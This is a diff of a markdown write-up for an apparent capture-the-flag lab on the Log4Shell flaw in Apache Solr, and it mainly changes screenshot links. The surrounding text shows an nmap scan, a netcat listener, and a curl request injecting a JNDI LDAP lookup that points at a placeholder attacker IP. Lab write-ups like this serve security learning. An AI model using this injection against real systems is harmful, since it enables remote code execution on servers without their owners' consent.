@@ -12,7 +12,7 @@ By using Command :
 
 ###  nmap -Sv -p- 8983 10.48.130.26
 We can able to find the Version of the port number 8983.
-<img width="959" height="527" alt="image" src="https://github.com/user-attachments/assets/bda1411f-d238-40c0-ad71-28687a404fba" />
+
 
 Correct Answer: Apache Solr
 
@@ -44,11 +44,6 @@ Correct Answer:params
 ### Task 4: Proof Of Concept
 Here we are Connecting  nc -lnvp 9999  netcat to connect the  website  curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'   In this we change into attacker's op address to inject the vulnerablility malicious java code due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes so bash (your command-line shell) does not interpret it as a variable. And the connection received to the netcat port.
 
-<img width="959" height="536" alt="image" src="https://github.com/user-attachments/assets/00734076-2865-4cf5-ad43-e4dd952c7e93" />
-
-
-<img width="1919" height="933" alt="Screenshot 2026-03-22 140116" src="https://github.com/user-attachments/assets/9a73f039-f1b2-4f96-a2ad-8c494142741c" />
-
 ## Task 5: Exploitation
 
 <img width="1156" height="855" alt="Screenshot 2026-03-22 235906" src="https://github.com/user-attachments/assets/6ad7c46c-46eb-4850-a73e-60ba0409f4a6" />
@@ -61,13 +56,13 @@ Also host a local python http server by using this command
 python3 -m http.server
 
 <img width="865" height="721" alt="Screenshot 2026-03-22 202553" src="https://github.com/user-attachments/assets/b4cc1f87-c240-4f28-839b-ad89b68669ad" />
-<img width="1919" height="1065" alt="Screenshot 2026-03-22 184129" src="https://github.com/user-attachments/assets/de288411-858d-4c2e-bde8-5546cb9de513" />
+
 
 ## Task 6: Persistance
 
 Check user account through whoami
 
-<img width="959" height="367" alt="image" src="https://github.com/user-attachments/assets/68062e9f-62f0-438d-826c-74fef98bc1d1" />
+<img width="200" height="67" alt="image" src="https://github.com/user-attachments/assets/47729527-bc2e-4d38-8968-9d92e985b785" />
 
 We did not know any usernames or passwords at the point, so trying against that protocol would be useless
 
@@ -77,7 +72,8 @@ It might be leads to changing passwords and data and informations
 
 The detection is found by the logs checking present in there
 
-<img width="959" height="332" alt="image" src="https://github.com/user-attachments/assets/9cba4c47-8203-45f7-a070-02672dd7fc77" />
+<img width="773" height="89" alt="image" src="https://github.com/user-attachments/assets/ca08ec9f-b04d-456a-aa52-30269f0e2152" />
+
 
 ## Task 8: Conclusion
 
